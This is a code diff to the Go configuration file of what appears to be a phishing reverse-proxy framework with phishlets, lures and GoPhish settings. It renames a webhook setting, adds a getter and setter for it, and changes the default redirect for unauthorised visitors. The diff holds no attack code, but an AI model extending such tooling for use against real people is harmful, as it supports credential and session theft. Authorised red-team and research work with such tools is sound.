@@ -90,23 +90,23 @@ type Config struct {
 	lures           []*Lure
 	lureIds         []string
 	subphishlets    []*SubPhishlet
-	kbWebhookUrl    string
+	webhookUrl      string
 	cfg             *viper.Viper
 }
 
 const (
-	CFG_GENERAL        = "general"
-	CFG_CERTIFICATES   = "certificates"
-	CFG_LURES          = "lures"
-	CFG_PROXY          = "proxy"
-	CFG_PHISHLETS      = "phishlets"
-	CFG_BLACKLIST      = "blacklist"
-	CFG_SUBPHISHLETS   = "subphishlets"
-	CFG_GOPHISH        = "gophish"
-	CFG_KB_WEBHOOK_URL = "kb_webhook_url"
+	CFG_GENERAL      = "general"
+	CFG_CERTIFICATES = "certificates"
+	CFG_LURES        = "lures"
+	CFG_PROXY        = "proxy"
+	CFG_PHISHLETS    = "phishlets"
+	CFG_BLACKLIST    = "blacklist"
+	CFG_SUBPHISHLETS = "subphishlets"
+	CFG_GOPHISH      = "gophish"
+	CFG_WEBHOOK_URL  = "webhook_url"
 )
 
-const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.google.com"
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -155,7 +155,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)
 
-	c.kbWebhookUrl = c.cfg.GetString(CFG_KB_WEBHOOK_URL)
+	c.webhookUrl = c.cfg.GetString(CFG_WEBHOOK_URL)
 
 	if c.general.OldIpv4 != "" {
 		if c.general.ExternalIpv4 == "" {
@@ -826,4 +826,15 @@ func (c *Config) GetGoPhishApiKey() string {
 
 func (c *Config) GetGoPhishInsecureTLS() bool {
 	return c.gophishConfig.InsecureTLS
+}
+
+func (c *Config) GetWebhookUrl() string {
+	return c.webhookUrl
+}
+
+func (c *Config) SetWebhookUrl(url string) {
+	c.webhookUrl = url
+	c.cfg.Set(CFG_WEBHOOK_URL, c.webhookUrl)
+	log.Info("webhook url set to: %s", url)
+	c.cfg.WriteConfig()
 }
